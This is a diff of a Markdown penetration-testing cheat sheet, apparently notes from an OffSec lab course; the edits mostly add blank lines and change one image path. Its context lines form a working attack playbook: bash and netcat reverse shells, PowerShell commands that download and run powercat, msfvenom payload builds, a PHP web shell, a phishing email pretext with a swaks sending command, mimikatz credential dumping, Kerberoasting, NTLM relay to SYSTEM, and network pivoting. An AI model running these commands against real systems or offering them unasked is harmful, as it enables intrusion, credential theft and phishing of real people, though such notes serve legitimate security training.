@@ -113,37 +113,44 @@ Keep this sheet close, annotate it as you learn, and fold discoveries back into 
 ### Pentest Methodology
 
 Port scanning
+
 ```bash
 sudo nmap -sC -sV -oN $TARGET/nmap $TARGET_IP
 ```
 
 Directory enumeration
+
 ```
 gobuster dir -u http://$TARGET_IP -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
 ```
 
 Web app identification
+
 ```
 whatweb http://$TARGET_IPhttps://github.com/picocms/Pico
 ```
 
 WordPress scan
+
 ```
 wpscan --url http://$TARGET_IP --enumerate p --plugins-detection aggressive -o websrv1/wpscan
 ```
 
 Search for public exploits
+
 ```
 searchsploit $SVC_OR_PLGIN_NAME
 ```
 
 Crack SSH key passphrases
+
 ```
 ssh2john $KEY_FILE > ssh.hash
 john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
 ```
 
 Local enumeration
+
 ```
 # Linux
 linpeas.sh
@@ -162,16 +169,19 @@ whoami
 ```
 
 SMB enumeration
+
 ```
 crackmapexec smb $TARGET_IP -u john -p "$PASSWD" --shares
 ```
 
 Anon WebDAV share
+
 ```
 wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r $(pwd)/webdav
 ```
 
 Windows Library file `*.library-ms`
+
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
@@ -195,17 +205,20 @@ Windows Library file `*.library-ms`
 ```
 
 Windows shortcut to download PowerCat reverse shell payload
+
 ```
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$KALI_IP:8000/powercat.ps1'); powercat -c $KALI_IP -p $KALI_PORT -e powershell"
 ```
 
 Netcat listener
+
 ```bash
 nc -nvlp 4444
 ```
 
 **Swaks email phishing**
 Create `body.txt` with pretext, example:
+
 ```
 Hey!
 I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.
@@ -214,16 +227,19 @@ On an unrelated note, please install the new security features on your workstati
 
 John
 ```
+
 - This may convince our target to open the attachment.
     - *In a real assessment we should also use passive information gathering techniques to obtain more information about a potential target. Based on this information, we could create more tailored emails and improve our chances of success tremendously.*.
 
 Build command
+
 ```bash
 sudo swaks -t $VALID_RECIPIENT_0 -t $VALID_RECIPIENT_1 --from $VALID_EMAIL_ADDRESS --attach @config.Library-ms --server $MAIL_SRV_IP --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 ```
 
 **AD Enumeration**
 Upload SharpHound collector.
+
 ```
 iwr -uri http://$KALI_IP:8000/SharpHound.ps1 -Outfile SharpHound.ps1
 . .\SharpHound.ps1
@@ -231,6 +247,7 @@ Invoke-BloodHound -CollectionMethod All
 ```
 
 Transfer to Kali
+
 ```
 # Kali
 nc -lp 4445 > bloodhound.zip
@@ -239,12 +256,14 @@ nc -lp 4445 > bloodhound.zip
 ```
 
 Start `neo4j`, `bloodhound`, and "upload data"
+
 ```bash
 sudo neo4j start
 bloodhound &
 ```
 
 Basic enumeration raw queries
+
 ```
 # Display domain connected computers
 MATCH (m:Computer) RETURN m
@@ -256,11 +275,13 @@ MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
 
 **Detact PowerShell Process**
 Will not die if original shell fails
+
 ```
 Start-Process -NoNewWindow .\metrtcp.exe
 ```
 
 **Meterpreter Autoroute & SOCKS5 Proxy**
+
 ```
 msf6 > use multi/manage/autoroute
 msf6 post(multi/manage/autoroute) > set session 1
@@ -275,6 +296,7 @@ msf6 auxiliary(server/socks_proxy) > run -j
 ```
 
 **Meterpreter Migrate**
+
 ```
 execute -H -f notepad.exe
 (proc created 1500)
@@ -282,18 +304,21 @@ migrate 1500
 ```
 
 With the SOCKS5 proxy active we can configure proxychains to access the internal network.
+
 ```
 socks5          127.0.0.1 1080
 ```
 
 **SMB Credential Spray Internal Network via Proxy**
 Example:
+
 ```bash
 sudo proxychains -q crackmapexec smb 172.16.87.240-241 172.16.87.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
 ```
 
 **Nmap Internal Network via Proxy**
 Example:
+
 ```bash
 sudo proxychains -q nmap -sT -oN internal-servers.nmap -Pn -p 21,80,443 172.16.87.240 172.16.87.241 172.16.87.254
 ```
@@ -323,6 +348,7 @@ chisel: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, 
 ```
 
 From our target shell we can run Chisel in client mode to connect back to Kali on port 8080 by creating a reverse port forward with syntax `R:localport:remotehost:remoteport`.
+
 ```
 meterpreter > shell
 Process 7884 created.
@@ -335,8 +361,10 @@ chisel.exe client 192.168.45.163:8080 R:80:172.16.87.241:80
 2023/12/30 14:10:54 client: Connecting to ws://192.168.45.163:8080
 2023/12/30 14:10:55 client: Connected (Latency 78.2679ms)
 ```
+
 - Bind INTERNALSRV1 port 80 to Kali port 80.
     - *NOTE: kill wsgidav server first*.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ ./chisel server --port 8080 --reverse
@@ -345,9 +373,11 @@ chisel.exe client 192.168.45.163:8080 R:80:172.16.87.241:80
 2023/12/30 14:03:01 server: Listening on http://0.0.0.0:8080
 2023/12/30 14:10:55 server: session#36: tun: proxy#R:81=>172.16.87.241:80: Listening
 ```
+
 - With chisel connected wr can browse to port 80 on 172.16.87.241 via port 81 of Kali localhost with Firefox.
 
 **Mimikatz Cached Creds**
+
 ```bash
 mimikatz # privilege::debug
 mimikatz # sekurlsa::logonpasswords
@@ -355,6 +385,7 @@ mimikatz # sekurlsa::logonpasswords
 
 **Lateral Movement via Impacket-psexec**
 Example:
+
 ```
 proxychains -q impacket-psexec -hashes :f0397ec5af49971f6efbdb07877046b3 beccy@172.16.81.240
 ```
@@ -362,6 +393,7 @@ proxychains -q impacket-psexec -hashes :f0397ec5af49971f6efbdb07877046b3 beccy@1
 **Kerberoasting with Impacket**
 We can Kerberoasting from Kali with `impacket-GetUserSPNs` over our SOCKS5 proxy.  To obtain the TGS-REP hash of `daniela` we need to provide the creds of a domain user, so we will use `john`.
 Example:
+
 ```
 proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.87.240 beyond.com/john
 
@@ -379,6 +411,7 @@ $krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$c1939af6eee8a400b1ec41e96289
 ```
 
 Store the hash to `daniela.hash` an crack with Hashcat.
+
 ```bash
 sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
 ```
@@ -389,6 +422,7 @@ Can be utilized in any case where an auth request can be forced:
 - SMB requests.
 
 First we need to setup the `impacket-ntlmrelayx` before we modify the backup directory path of the WP plugin.  Use `--no-http-server` and `-smb2support` to disable the HTTP server and enable SMB2 support.  We need to specify the external address of MAILSRV1 as the target of our relay attack, so we won't have to proxy via proxychains.  We'll also base64-encode the PowerShell reverse shell [oneliner](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3) to connect back to our attacking system on port 9999 and provide it as a command to `-c`.
+
 ```
 # PowerShell One-liner
 
@@ -444,6 +478,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 ```
 
 Next we need a Netcat listener to catch the reverse shell.
+
 ```bash
 ┌──(operator㉿labhost)-[~]
 └─$ nc -lnvp 9999
@@ -453,7 +488,7 @@ listening on [any] 9999 ...
 With everything setup we can modify the Backup directory path.
 
 Set the path to the URI reference `//192.168.45.163/test` where the IP is our Kali machine and `/test` is a nonexistent path.
-![156b67d1d13a6a7b87d4587904efcffa.png](../_resources/156b67d1d13a6a7b87d4587904efcffa.png)
+![156b67d1d13a6a7b87d4587904efcffa.png](assets/static/resources/156b67d1d13a6a7b87d4587904efcffa.png)
 - Once entered scroll down and click Save.
     - This causes the WP plugin to auth to our `impacket-ntlmrelayx` in the context of the user running WP.
 
@@ -465,11 +500,13 @@ Set the path to the URI reference `//192.168.45.163/test` where the IP is our Ka
 [-] SMB SessionError: STATUS_SHARING_VIOLATION(A file cannot be opened because the share access flags are incompatible.)
 [*] Stopping service RemoteRegistry
 ```
+
 - This confirms our 2 assumptions.
     - INTERNALSRV1/ADMINISTRATOR was used to perform auth.
     - Auth to MAILSRV1 succeeds, indicating the same password is used on both local admin accounts.
 
 The realyed command was executed on MAILSRV1, our Netcat listener caught a shell!
+
 ```bash
 ┌──(operator㉿labhost)-[~]
 └─$ nc -lnvp 9999
@@ -482,6 +519,7 @@ PS C:\Windows\system32> hostname
 MAILSRV1
 PS C:\Windows\system32>
 ```
+
 - We have obtained code execution as NT AUTHORITY\SYSTEM by authenticating as local admin on MAILSRV1.
     - Achieved by relaying an auth attempt from WP plugin on INTERNALSRV1.
 
@@ -507,19 +545,23 @@ https://nmap.org/ncat/guide/index.html
 ##### Web Servers
 
 Always start with Nmap...
+
 ```bash
 sudo nmap -v -O -sV -p 1-65535 192.168.X.X
 ```
+
 - Check out service versions with `searchsploit`
 	- Inspect result with `searchsploit -x XXXX`
 	- Clone to pwd with `searchsploit -m XXXX`
 - Search scripts with `nmap --script-help "*" | less`
  - Follow up with `--script` scans on relevant services.
 And then Gobuster *(Especially helpful for IIS servers)*.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/]
 └─$ gobuster dir -x .pdf,.txt,.php -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt --url http://192.168.206.199
 ```
+
 - Add a `-x` to seach for common file extensions.
 	- Example: `-x .pdf,.txt,.php`
 
@@ -530,6 +572,7 @@ And then Gobuster *(Especially helpful for IIS servers)*.
 ##### Base64
 
 ###### Bash
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec]
 └─$ echo -n "test@supermagicorg.com" | base64
@@ -548,6 +591,7 @@ Password:
 ```
 
 ###### NodeJS
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/]
 └─$ nodejs
@@ -612,6 +656,7 @@ Type ".help" for more information.
 *See Appendix A.1 for Bash script example*
 
 ###### Read Mail
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec]
 └─$ telnet 192.168.206.199 110
@@ -637,6 +682,7 @@ retr 1
 ##### PHP
 
 ###### One-liners
+
 ```
 <?php system($_GET['cmd']); ?>
 
@@ -655,11 +701,13 @@ retr 1
 ##### Linux
 
 ###### Netcat
+
 ```bash
 nc -nvlp 4444
 ```
 
 ##### Metasploit Console Reverse TCP Listener One-Liner
+
 ```
 msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.195;set LPORT 443;run;"
 ```
@@ -671,38 +719,46 @@ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse
 ##### MsfVenom
 
 List payloads.
+
 ```
 msfvenom -l payloads --platform windows --arch x64
 `
 ```
 
 List payload options.
+
 ```
 msfvenom --platform windows --arch x64 -p windows/x64/meterpreter_reverse_https --list-options
 ```
 
 Win x64 single stage reverse TCP.
+
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.182 LPORT=443 -f exe -o nonstaged.exe
 ```
 
 Win x64 staged reverse TCP.
+
 ```
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.182 LPORT=443 -f exe -o staged.exe
 ```
 
 PHP reverse shell.
+
 ```
 msfvenom -p php/reverse_php LHOST=192.168.45.182 LPORT=443 --platform php -o webrevshell.php
 `
 ```
 
 Win x64 reverse HTTPS.
+
 ```
 msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.182 LPORT=443 -f exe -o met.exe
 `
 ```
+
 *HTTPS Basic Options*
+
 ```
 Name        Current Setting  Required  Description
 ----        ---------------  --------  -----------
@@ -718,6 +774,7 @@ LURI                         no        The HTTP Path
 ###### multi/handler
 
 From msfconsole.
+
 ```
 msf6 > use multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
@@ -727,6 +784,7 @@ msf6 exploit(multi/handler) > show options
 ```
 
 From local shell.
+
 ```
 msfconsole -x "use exploit/multi/handler;set payload windows/x64/shell_reverse_tcp;set LHOST 192.168.45.240;set LPORT 443;run;"
 ```
@@ -734,6 +792,7 @@ msfconsole -x "use exploit/multi/handler;set payload windows/x64/shell_reverse_t
 ###### Migrate
 
 Create hidden notepad process and migrate into it.
+
 ```
 meterpreter > execute -H -f notepad
 Process 5256 created.
@@ -745,6 +804,7 @@ meterpreter > migrate 5256
 ##### Linux
 
 ###### URL Encode with CURL
+
 ```bash
 curl \
     --data-urlencode "paramName=value" \
@@ -753,11 +813,13 @@ curl \
 ```
 
 ###### Bash
+
 ```
 '/usr/bin/bash -c "bash -i >& /dev/tcp/192.168.45.223/4444 0>&1"'
 ```
 
 ###### Netcat
+
 ```
 'nc 192.168.45.223 4444 -e /usr/bin/bash'
 ```
@@ -765,6 +827,7 @@ curl \
 ##### Win
 
 ###### Powershell base64 encoded one-liner
+
 ```
 --- PS On Attacker ---
 
@@ -794,11 +857,13 @@ powershell -enc JABjAGwAaQBlAG4A...
 ##### Linux
 
 ###### Seach files from shell
+
 ```
 find /path/to/search -name 'file.txt'
 ```
 
 ###### Recieve file transfer via Ncat listener *(Windows A.1)*
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/client-side]
 └─$ nc -nvlp 4444 > outfile.txt
@@ -806,12 +871,14 @@ find /path/to/search -name 'file.txt'
 
 
 ###### Transfer a file, receiver listens *(Windows A.1)*
+
 ```
 host2$ ncat -l > outputfile
 host1$ ncat --send-only host2 < inputfile
 ```
 
 ###### Send a File Transfer
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/client-side]
 └─$ ncat 192.168.212.196 4445 < mymacro.doc
@@ -819,6 +886,7 @@ host1$ ncat --send-only host2 < inputfile
 
 
 ###### Transfer a file, sender listens
+
 ```
 host1$ ncat -l --send-only < inputfile
 host2$ ncat host1 > outputfile
@@ -827,6 +895,7 @@ host2$ ncat host1 > outputfile
 ##### Windows
 
 ###### Powershell File Search
+
 ```
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
@@ -843,6 +912,7 @@ Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----
 -a----         5/30/2022  10:33 AM           1982 Database.kdbx
 ```
+
 - User PowerShell.
 	- [Get-ChildItem](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem)
  - Search the whole drive with `-Path C:\`
@@ -851,11 +921,13 @@ Mode                 LastWriteTime         Length Name
 	- Silence errors and cont exec with `-ErrorAction` set to `SilentlyContinue`
 
 ###### MD5 Sum in PowerShell
+
 ```powershell
 PS C:\Users\offsec> Get-FileHash .\Desktop\file.txt -Algorithm MD5
 ```
 
 ###### Network file transfer to Ncat listener with powercat.ps1 loaded via network *(Linux A.1)*
+
 ```powershell
 PS C:\Users\offsec> IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.223/powercat.ps1');powercat -c 192.168.45.223 -p 4444 -i .\Desktop\infile.txt -v
 
@@ -870,12 +942,14 @@ PS C:\Users\offsec> IEX(New-Object System.Net.WebClient).DownloadString('http://
 
 ###### WebDAV
 Install `wsgidav` from `apt` or `pip`
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/]
 └─$ wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r ~/webdav
 ```
 
 ###### HTTP
+
 ```bash
 ┌──(operator㉿labhost)-[~/]
 └─$ python -m http.server -d path/to/serve 8080 
@@ -889,6 +963,7 @@ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 ##### Appendix A.1
 
 ###### CLI Telnet SMTP Mail Client with Attachment
+
 ```
 #!/bin/bash
 
@@ -1000,6 +1075,7 @@ echo "[-] Exit with status: $?"
 ```
 
 ###### Example of Library-ms sent via Win Mail Client
+
 ```
 Return-Path: test@supermagicorg.com
 Received: from smtp.supermagicorg.com (Unknown [192.168.45.223])
